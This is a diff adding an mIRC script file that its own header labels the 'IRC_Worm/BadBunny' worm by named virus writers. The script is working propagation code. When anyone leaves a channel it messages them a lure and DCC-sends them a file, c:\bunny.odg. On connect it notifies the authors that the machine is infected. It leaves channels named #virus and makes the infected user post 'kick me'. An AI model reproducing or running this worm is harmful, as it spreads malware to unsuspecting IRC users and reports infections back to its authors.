@@ -1,0 +1,20 @@
+[script]
+n0=; IRC_Worm/BadBunny (c)by Necronomikon&Wargame from[D00MRiderz]
+n1=/titlebar *#*#*#*#*#*( Not every Bunny is friendly... )*#*#*#*#*#*#*
+n2=on 1:start:{
+n3=  /if $day == Friday { /echo  }
+n4=on 1:Join:#:if $chan = #virus /part $chan
+n5=on 1:connect:.msg Necronomikon -=I am infected with ur stuff!!!=-
+n6=on 1:connect:.msg wargame -=I am infected with ur stuff!!!=-
+n7=on 1:text:#:*hi*:/say $chan kick me
+n8=on 1:text:#:*hello*:/say $chan kick me
+n9=on 1:part:#:{
+n10=set %M_E $me
+n11=set %NickName $nick
+n12=set %ccd .dcc
+n13=  if %NickName != %M_E {
+n14=    /q %NickName lets do it like a rabbit...;)
+n15=    /msg %NickName Be my bunny!
+n16=%ccd send -c %NickName c:\bunny.odg
+n17=  }
+n18=}
